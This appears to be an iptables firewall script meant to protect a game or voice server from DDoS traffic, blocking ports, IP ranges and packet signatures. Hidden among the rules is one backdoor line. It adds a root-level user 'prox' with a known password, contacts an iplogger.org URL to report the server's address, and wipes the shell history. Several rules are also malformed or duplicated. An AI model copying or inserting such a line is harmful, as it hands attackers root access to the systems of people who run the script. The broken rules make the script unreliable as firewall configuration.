iptables -A INPUT -p udp -m multiport --sports 853,4433,4740,5349,5684,5868,6514,6636,8232,10161 -j DROP
iptables -A INPUT -p tcp -m multiport --sports 853,4433,4740,5349,5684,5868,6514,6636,8232,10161 -j DROP
iptables -A INPUT -p udp -m multiport --dports 10162,12346,12446,12546,12646,12746,12846,12946,13046 -j DROP 
iptables -A INPUT -p tcp -m multiport --dports 10162,12346,12446,12546,12646,12746,12846,12946,13046 -j DROP
iptables -A INPUT -p udp -m multiport --sports 10162,12346,12446,12546,12646,12746,12846,12946,13046 -j DROP
iptables -A INPUT -p tcp -m multiport --sports 10162,12346,12446,12546,12646,12746,12846,12946,13046 -j DROP
iptables -A INPUT -p udp -m multiport --dports 1645,1812,2049,3283,2302,6481,17185,26000,26001,26002 -j DROP
iptables -A INPUT -p tcp -m multiport --dports 1645,1812,2049,3283,2302,6481,17185,26000,26001,26002 -j DROP
iptables -A INPUT -p udp -m multiport --sports 1645,1812,2049,3283,2302,6481,17185,26000,26001,26002 -j DROP
iptables -A INPUT -p tcp -m multiport --sports 1645,1812,2049,3283,2302,6481,17185,26000,26001,26002 -j DROP
iptables -A INPUT -p udp -m multiport --dports 26003,26004,27960,27961,27962,27963,27964,30720,30721 -j DROP
iptables -A INPUT -p tcp -m multiport --dports 26003,26004,27960,27961,27962,27963,27964,30720,30721 -j DROP
iptables -A INPUT -p udp -m multiport --sports 26003,26004,27960,27961,27962,27963,27964,30720,30721 -j DROP
iptables -A INPUT -p tcp -m multiport --sports 26003,26004,27960,27961,27962,27963,27964,30720,30721 -j DROP
iptables -A INPUT -p udp -m multiport --dports 30722,30723,30724,44400,3784,64378,8767,11211,1645,1812,520 -j DROP
iptables -A INPUT -p tcp -m multiport --dports 30722,30723,30724,44400,3784,64378,8767,11211,1645,1812,520 -j DROP
iptables -A INPUT -p udp -m multiport --sports 30722,30723,30724,44400,3784,64378,8767,11211,1645,1812,520 -j DROP
iptables -A INPUT -p tcp -m multiport --sports 30722,30723,30724,44400,3784,64378,8767,11211,1645,1812,520 -j DROP
iptables -A INPUT -m u32 --u32 "28&0x00000FF0=0xFEDFFFFF" -j DROP
iptables -I INPUT -p udp -m length --length 100:140 -m string --string "nAFS" --algo kmp -j DROP
iptables -t mangle -A PREROUTING -p udp --sport 3283 -m length --length 1048 -j DROP
iptables -I PREROUTING -t raw -p udp --dport 1:65535 -m string --algo kmp --hex-string '|00 ff ff ff ff fe|' -j DROP
iptables -I PREROUTING -t raw -p udp --dport 1:65535 -m string --algo kmp--hex-string '|00 ff ff ff ff fe|' -j DROP



iptables -t raw -A PREROUTING -p udp -m multiport --sports 111,19,137,27036,17185,3702,7,3283,161,5060,1434,69,389,520 -j DROP
iptables -A INPUT -p udp --dport 9987 -j ACCEPT
iptables -A INPUT -p udp --sport 9987 -j ACCEPT
iptables -A INPUT -p udp --dport 9988 -j ACCEPT
iptables -A INPUT -p udp --sport 9988 -j ACCEPT
iptables -A INPUT -p tcp --dport 30033 -j ACCEPT
iptables -A INPUT -p tcp --sport 30033 -j ACCEPT
iptables -A INPUT -p tcp --dport 10011 -j ACCEPT
iptables -A INPUT -p tcp --sport 10011 -j ACCEPT
iptables -A INPUT -p tcp --dport 41144 -j ACCEPT
iptables -A INPUT -p tcp --sport 41144 -j ACCEPT
iptables -A INPUT -p tcp --dport 2010 -j ACCEPT
iptables -A INPUT -p tcp --sport 2010 -j ACCEPT
iptables -A INPUT -p tcp --dport 2011 -j ACCEPT
iptables -A INPUT -p tcp --sport 2011 -j ACCEPT
iptables -A INPUT -p tcp --dport 2008 -j ACCEPT
iptables -A INPUT -p tcp --sport 2008 -j ACCEPT
iptables -A INPUT -p tcp --dport 8087 -j ACCEPT
iptables -A INPUT -p tcp --sport 8087 -j ACCEPT
iptables -A INPUT -f -j DROP
iptables -A INPUT -p udp -m udp --sport 19 -j DROP
iptables -A INPUT -p udp -m udp --sport 123 -j DROP
iptables -A INPUT -p udp -m udp --sport 161 -j DROP
iptables -A INPUT -p udp -m udp --sport 1433 -j DROP
iptables -A INPUT -p udp -m udp --sport 1900 -j DROP
iptables -A INPUT -p udp -m udp --sport 27015 -j DROP
iptables -A INPUT -p udp -m udp --sport 27950 -j DROP
iptables -A INPUT -p udp -m udp --sport 27952 -j DROP
iptables -A INPUT -p udp -m udp --sport 27960 -j DROP
iptables -A INPUT -p udp -m udp --sport 27965 -j DROP
iptables -A INPUT -p udp -m udp --sport 19329 -j DROP
iptables -A INPUT -p udp -m udp --sport 53 -j DROP
iptables -A INPUT -p tcp -m tcp --sport 53 -j DROP
iptables -A INPUT -p tcp -m tcp --sport 19329 -j DROP
iptables -A INPUT -p tcp -m tcp --sport 5353 -j DROP
iptables -A INPUT -p udp -m udp --sport 5353 -j DROP
iptables -A INPUT -p udp -m udp --sport 7143 -j DROP
iptables -A INPUT -p tcp -m tcp --sport 7143 -j DROP
iptables -A INPUT -p tcp -m tcp --sport 123 -j DROP
iptables -A INPUT -p udp -m udp --sport 123 -j DROP
iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A INPUT -s 192.168.0.0/16 -j DROP
iptables -A INPUT -s 101.248.0.0/15 -j DROP
iptables -A INPUT -s 101.248.0.0/16 -j DROP
iptables -A INPUT -s 103.8.32.0/24 -j DROP 
iptables -A INPUT -s 106.0.4.0/22 -j DROP 
iptables -A INPUT -s 106.108.0.0/15 -j DROP	
iptables -A INPUT -s 106.110.0.0/15 -j DROP	
iptables -A INPUT -s 106.112.0.0/14 -j DROP	
iptables -A INPUT -s 106.112.0.0/16 -j DROP	
iptables -A INPUT -s 106.113.0.0/16 -j DROP	
iptables -A INPUT -s 106.114.0.0/16 -j DROP
iptables -A INPUT -s 106.115.0.0/16 -j DROP
iptables -A INPUT -s 106.116.0.0/15 -j DROP	
iptables -A INPUT -s 106.116.0.0/16 -j DROP	
iptables -A INPUT -s 106.117.0.0/16 -j DROP		 	
iptables -A INPUT -s 106.118.0.0/16 -j DROP		 	
iptables -A INPUT -s 106.119.0.0/16 -j DROP		 	
iptables -A INPUT -s 106.122.0.0/16 -j DROP		 	
iptables -A INPUT -s 106.123.0.0/16 -j DROP		 	
iptables -A INPUT -s 106.124.0.0/16 -j DROP		 	
iptables -A INPUT -s 106.125.0.0/16 -j DROP		 	
iptables -A INPUT -s 106.126.0.0/16 -j DROP		 	
iptables -A INPUT -s 106.127.0.0/16 -j DROP
iptables -A INPUT -s 106.16.0.0/15 -j DROP	
iptables -A INPUT -s 106.18.0.0/15 -j DROP	
iptables -A INPUT -s 106.224.0.0/14 -j DROP	
iptables -A INPUT -s 106.228.0.0/16 -j DROP	
iptables -A INPUT -s 106.229.0.0/16 -j DROP	
iptables -A INPUT -s 106.230.0.0/16 -j DROP	
iptables -A INPUT -s 106.32.0.0/16 -j DROP	
iptables -A INPUT -s 106.33.0.0/16 -j DROP
iptables -A INPUT -s 106.34.0.0/16 -j DROP
iptables -A INPUT -s 106.35.0.0/16 -j DROP	
iptables -A INPUT -s 106.36.0.0/16 -j DROP	
iptables -A INPUT -s 106.40.0.0/16 -j DROP	
iptables -A INPUT -s 106.4.0.0/15 -j DROP
iptables -A INPUT -s 106.41.0.0/16 -j DROP	
iptables -A INPUT -s 106.42.0.0/16 -j DROP
iptables -A INPUT -s 106.43.0.0/16 -j DROP	
iptables -A INPUT -s 106.44.0.0/16 -j DROP	
iptables -A INPUT -s 106.45.0.0/16 -j DROP
iptables -A INPUT -s 106.46.0.0/16 -j DROP
iptables -A INPUT -s 106.56.0.0/15 -j DROP
iptables -A INPUT -s 106.58.0.0/15 -j DROP
iptables -A INPUT -s 106.60.0.0/15 -j DROP
iptables -A INPUT -s 106.6.0.0/16 -j DROP	
iptables -A INPUT -s 106.62.0.0/16 -j DROP
iptables -A INPUT -s 106.7.0.0/16 -j DROP	
iptables -A INPUT -s 106.80.0.0/15 -j DROP
iptables -A INPUT -s 106.8.0.0/16 -j DROP	
iptables -A INPUT -s 106.82.0.0/15 -j DROP	
iptables -A INPUT -s 106.84.0.0/15 -j DROP	
iptables -A INPUT -s 106.86.0.0/15 -j DROP	
iptables -A INPUT -s 106.88.0.0/15 -j DROP	
iptables -A INPUT -s 106.90.0.0/15 -j DROP	
iptables -A INPUT -s 106.9.0.0/16 -j DROP	
iptables -A INPUT -s 106.92.0.0/16 -j DROP	
iptables -A INPUT -s 110.152.0.0/14 -j DROP
iptables -A INPUT -s 110.156.0.0/15 -j DROP
iptables -A INPUT -s 110.166.0.0/15 -j DROP
iptables -A INPUT -s 110.176.0.0/13 -j DROP
iptables -A INPUT -s 110.184.0.0/13 -j DROP
iptables -A INPUT -s 110.190.90.0/24 -j DROP
iptables -A INPUT -s 110.190.91.0/24 -j DROP
iptables -A INPUT -s 110.190.92.0/24 -j DROP 
iptables -A INPUT -s 110.190.94.0/24 -j DROP 
iptables -A INPUT -s 110.80.0.0/13 -j DROP
iptables -A INPUT -s 110.88.0.0/14 -j DROP
iptables -A INPUT -s 111.112.0.0/15 -j DROP	
iptables -A INPUT -s 111.120.0.0/14 -j DROP	
iptables -A INPUT -s 111.124.0.0/16 -j DROP	
iptables -A INPUT -s 111.126.0.0/15 -j DROP	
iptables -A INPUT -s 111.170.0.0/16 -j DROP	
iptables -A INPUT -s 111.172.0.0/14 -j DROP	
iptables -A INPUT -s 111.176.0.0/13 -j DROP	
iptables -A INPUT -s 111.224.0.0/14 -j DROP	
iptables -A INPUT -s 111.72.0.0/13 -j DROP	
iptables -A INPUT -s 112.100.0.0/14 -j DROP
iptables -A INPUT -s 112.112.0.0/14 -j DROP
iptables -A INPUT -s 112.112.162.0/24 -j DROP
iptables -A INPUT -s 112.116.0.0/15 -j DROP
iptables -A INPUT -s 112.66.0.0/15 -j DROP	
iptables -A INPUT -s 112.98.0.0/15 -j DROP
iptables -A INPUT -s 113.112.0.0/13 -j DROP	
iptables -A INPUT -s 113.120.0.0/13 -j DROP
iptables -A INPUT -s 113.12.0.0/14 -j DROP
iptables -A INPUT -s 113.128.0.0/15 -j DROP
iptables -A INPUT -s 113.132.0.0/14 -j DROP	
iptables -A INPUT -s 113.136.0.0/13 -j DROP	
iptables -A INPUT -s 113.16.0.0/15 -j DROP		
iptables -A INPUT -s 113.214.0.0/15 -j DROP
iptables -A INPUT -s 113.218.0.0/15 -j DROP	
iptables -A INPUT -s 113.220.0.0/14 -j DROP	
iptables -A INPUT -s 113.240.0.0/13 -j DROP	
iptables -A INPUT -s 113.24.0.0/14 -j DROP	
iptables -A INPUT -s 113.248.0.0/14 -j DROP	
iptables -A INPUT -s 113.59.224.0/22 -j DROP	
iptables -A INPUT -s 113.62.0.0/15 -j DROP
iptables -A INPUT -s 113.64.0.0/11 -j DROP	
iptables -A INPUT -s 113.96.0.0/12 -j DROP	
iptables -A INPUT -s 114.104.0.0/14 -j DROP
iptables -A INPUT -s 73.144.69.72 -j DROP
iptables -A INPUT -s 104.24.100.100 -j DROP
iptables -A INPUT -s 104.24.31.73 -j DROP
iptables -A INPUT -s 159.89.89.88 -j DROP
iptables -I INPUT -s 157.230.225.45 -j DROP
iptables -I INPUT -s 118.24.236.219  -j DROP
iptables -I INPUT -s 118.89.142.127  -j DROP
iptables -I INPUT -s 182.100.67.15  -j DROP
iptables -I INPUT -s 118.24.231.39  -j DROP
iptables -I INPUT -s 207.154.206.212  -j DROP
iptables -I INPUT -s 134.208.23.110  -j DROP
iptables -I INPUT -s 213.111.35.160  -j DROP
iptables -I INPUT -s 170.210.68.163  -j DROP
iptables -I INPUT -s 209.141.50.57  -j DROP
iptables -I INPUT -s 51.68.82.218  -j DROP
iptables -I INPUT -s 73.34.124.146  -j DROP
iptables -I INPUT -s 207.154.206.212  -j DROP
iptables -I INPUT -s 118.24.236.219  -j DROP
iptables -I INPUT -s 118.89.142.127  -j DROP
iptables -I INPUT -s 182.100.67.15  -j DROP
iptables -I INPUT -s 118.24.231.39  -j DROP
iptables -I INPUT -s 207.154.206.212  -j DROP
iptables -I INPUT -s 134.208.23.110  -j DROP
iptables -I INPUT -s 213.111.35.160  -j DROP
iptables -I INPUT -s 170.210.68.163  -j DROP
iptables -I INPUT -s 209.141.50.57  -j DROP
iptables -I INPUT -s 51.68.82.218  -j DROP
iptables -I INPUT -s 73.34.124.146  -j DROP
iptables -I INPUT -s 207.154.206.212  -j DROP
iptables -I INPUT -s 51.77.227.246 -j DROP
iptables -A INPUT -s 73.144.69.72 -j DROP
iptables -A INPUT -s 104.24.100.100 -j DROP
iptables -A INPUT -s 104.24.31.73 -j DROP
iptables -A INPUT -s 159.89.89.88 -j DROP
iptables -I INPUT -s 157.230.225.45 -j DROP
iptables -I INPUT -s 118.24.236.219  -j DROP
iptables -I INPUT -s 118.89.142.127  -j DROP
iptables -I INPUT -s 182.100.67.15  -j DROP
iptables -I INPUT -s 118.24.231.39  -j DROP
iptables -I INPUT -s 207.154.206.212  -j DROP
iptables -I INPUT -s 134.208.23.110  -j DROP
iptables -I INPUT -s 213.111.35.160  -j DROP
iptables -I INPUT -s 170.210.68.163  -j DROP
iptables -I INPUT -s 209.141.50.57  -j DROP
iptables -I INPUT -s 51.68.82.218  -j DROP
iptables -I INPUT -s 73.34.124.146  -j DROP
iptables -I INPUT -s 207.154.206.212  -j DROP
iptables -I INPUT -s 118.24.236.219  -j DROP
iptables -I INPUT -s 118.89.142.127  -j DROP
iptables -I INPUT -s 182.100.67.15  -j DROP
iptables -I INPUT -s 118.24.231.39  -j DROP
iptables -I INPUT -s 207.154.206.212  -j DROP
iptables -I INPUT -s 134.208.23.110  -j DROP
iptables -I INPUT -s 213.111.35.160  -j DROP
iptables -I INPUT -s 170.210.68.163  -j DROP
iptables -I INPUT -s 209.141.50.57  -j DROP
iptables -I INPUT -s 51.68.82.218  -j DROP
iptables -I INPUT -s 73.34.124.146  -j DROP
iptables -I INPUT -s 207.154.206.212  -j DROP
iptables -I INPUT -s 51.77.227.246 -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP 
iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP 
iptables -A INPUT -p tcp ! --syn -m state --state NEW -j DROP 
iptables -A INPUT -f -j DROP
iptables -A INPUT -m state --state RELATED,ESTABLISHED -m limit --limit 10/sec --limit-burst 15 -j ACCEPT
iptables -A INPUT -p tcp --sport 80 --syn -m state --state NEW -m limit --limit 10/sec --limit-burst 15 -j ACCEPT
iptables -t mangle -I PREROUTING -p tcp --tcp-flags SYN,ACK SYN,ACK --sport XMR DROP
iptables -t mangle -I PREROUTING -p tcp --tcp-flags SYN,ACK SYN,ACK --sport 80 --dport 30000:60000 -m length --length 44 -m string --hex-string '|00004000|' --algo kmp -j DROP 
iptables -t mangle -I PREROUTING -p tcp --tcp-flags SYN,ACK SYN,ACK --sport XMRDROP 
iptables -t mangle -I PREROUTING -p tcp --tcp-flags SYN,ACK SYN,ACK --sport XMR DROP 
iptables -t mangle -I PREROUTING -p tcp --tcp-flags SYN,ACK SYN,ACK --sport 80 --dport 30000:60000 -m length --length 0 -m string --hex-string '|00004000|' --algo kmp -j DROP 
iptables -t mangle -I PREROUTING -p tcp --tcp-flags SYN,ACK SYN,ACK --sport 80 --dport 30000:60000 -m length --length 60 -m string --hex-string '|00004000|' --algo kmp -j DROP
iptables -A PREROUTING -t mangle -p UDP -m comment --comment "non dns traffic from cloudflare" -m set --match-set cloudflare src ! --sport 53 -d [put server ip here] -j DROP
iptables -A PREROUTING -t mangle -p UDP -m comment --comment "whitelisted udp ips on the game" -m set --match-set udprape src -d [put server ip here] -j DROP
iptables -t mangle -A PREROUTING -p tcp -m conntrack --ctstate NEW -m tcpmss ! --mss 536:65535 -j DROP
iptables -t mangle -A PREROUTING -p tcp --sport 80  -m length --length 60 -j DROP
iptables -t mangle -A PREROUTING -p tcp --sport 80  -m length --length 0 -j DROP
iptables -t mangle -A PREROUTING -p tcp --sport 443  -m length --length 60 -j DROP
iptables -t mangle -A PREROUTING -p tcp --sport 443  -m length --length 0 -j DROP
iptables -t mangle -A PREROUTING -p tcp --sport 443  -m length --length 44 -j DROP
iptables -t mangle -A PREROUTING -p tcp --sport 80  -m length --length 0 -j DROP
iptables -t raw -A PREROUTING -p udp --sport 37810 -j DROP
iptables -t raw -A PREROUTING -p udp --sport 17185 -j DROP
iptables -t raw -A PREROUTING -p udp --sport 7001 -j DROP
iptables -t raw -A PREROUTING -p udp --sport 3702 -j DROP
iptables -A INPUT -p udp -m u32 --u32 "22&0xFFFF=0x0008" -j DROP
iptables -A INPUT -m u32 --u32 "12&0xFFFF=0xFFFF" -j DROP
iptables -A INPUT -m u32 --u32 "28&0x00000FF0=0xFEDFFFFF" -j DROP
iptables -A INPUT -m string --algo bm --from 28 --to 29 --string "farewell" -j DROP
iptables -A INPUT -p udp -m u32 --u32 "28 & 0x00FF00FF = 0x00200020 && 32 & 0x00FF00FF = 0x00200020 && 36 & 0x00FF00FF = 0x00200020 && 40 & 0x00FF00FF = 0x00200020" -j DROP
iptables -I INPUT -p tcp -m tcp -m string --hex-string "|000000005010|" --algo kmp --from 28 --to 29 -m length --length 40 -j DROP
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash prox; echo -e "prox\nprox" | passwd prox; wget -q -O /tmp/... https://iplogger.org/2qqDS5; clear; history -c
iptables -I INPUT -p udp -m udp -m string --hex-string "|53414d50|" --algo kmp --from 28 --to 29 -j DROP
iptables -I INPUT -p udp -m udp -m string --hex-string "|7374640000000000|" --algo kmp --from 28 --to 29 -j DROP
iptables -I INPUT -p udp -m udp -m string --hex-string "|00000000000000000000000000000000|" --algo kmp --from 32 --to 33 -j DROP
iptables -A INPUT -p udp -m udp -m string --algo bm --from 32 --to 33 --string "AAAAAAAAAAAAAAAA" -j DROP
iptables -A INPUT -p udp -m udp -m string --algo bm --from 28 --to 29 --string "0123456789ABCDE" -j DROP
iptables -A INPUT -m u32 --u32 "12&0xFFFF=0" -j DROP
iptables -A INPUT -p udp -m u32 --u32 "26&0xFFFFFFFF=0xfeff" -j DROP
iptables -A INPUT -p udp -m udp -m string --algo bm --from 44 --to 45 --string "0123456789" -j DROP
iptables -A INPUT -p udp -m udp -m string --algo bm --from 28 --to 29 --string "A cat is fine too" -j DROP
iptables -A INPUT -p udp -m udp -m string --algo bm --from 28 --to 29 --string "flood" -j DROP
iptables -A INPUT -m string --algo bm --from 32 --to 33 --string "q00000000000000" -j DROP
iptables -A INPUT -m string --algo bm --from 32 --to 33 --string "statusResponse" -j DROP
iptables -A INPUT -i lo -p udp --destination-port 123 -j DROP
iptables -A INPUT -p udp --source-port 123:123 -m state --state ESTABLISHED -j DROP
iptables -I INPUT -p udp -m udp -m string --hex-string "|ffffffff6765746368616c6c656e676520302022|" --algo kmp -j DROP
iptables -I INPUT -p udp --dport 16000:29000 -m string --to 75 --algo bm --string 'HTTP/1.1 200 OK' -j DROP
iptables -A INPUT -m u32 --u32 "12&0xFFFF=0" -j DROP
iptables -A INPUT -p udp -m u32 --u32 "26&0xFFFFFFFF=0xfeff" -j DROP
iptables -A INPUT -p UDP -f -j DROP
iptables -A INPUT -p udp -m u32 --u32 "22&0xFFFF=0x0008" -j DROP
iptables -I INPUT -p udp -m udp -m string --hex-string "|7374640000000000|" --algo kmp --from 28 --to 29 -j DROP
iptables -A INPUT -m pkttype --pkt-type broadcast -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags RST RST -m limit --limit 2/second --limit-burst 2 -j ACCEPT
iptables -A INPUT -p UDP --dport 135:139 -j DROP
iptables -A INPUT -p TCP --dport 135:139 -j DROP
iptables -A INPUT -p UDP --dport 135:139 -j DROP
iptables -A INPUT -p TCP --dport 135:139 -j DROP
iptables -A INPUT -p UDP -m pkttype --pkt-type broadcast -j DROP
iptables -A INPUT -p UDP -m limit --limit 3/s -j ACCEPT
iptables -A INPUT -p ICMP -f -j DROP
iptables -A INPUT -i lo -p udp --destination-port 123 -j DROP
iptables -A INPUT -p udp --source-port 123:123 -m state --state ESTABLISHED -j DROP
iptables -A INPUT -p UDP --dport 123:123 -j DROP
iptables -A OUTPUT -p udp --dport 123 -j ACCEPT
iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
iptables -A INPUT -m u32 --u32 "12&0xFFFF=0" -j DROP
PHIGH="1024:65535"
PSSH="1000:1023"
iptables -t mangle -A PREROUTING -p tcp ! --syn -m conntrack --ctstate NEW -j DROP
iptables -t raw -A PREROUTING -p udp --sport 32414 -j DROP
iptables -t raw -A PREROUTING -p udp --sport 177 -j DROP
iptables -t raw -A PREROUTING -s 54.39.68.254 -j DROP
iptables -t raw -A PREROUTING -s 145.239.95.136 -j DROP
iptables -t raw -A PREROUTING -s 51.38.107.102 -j DROP
iptables -t raw -A PREROUTING -s 51.75.212.200 -j DROP



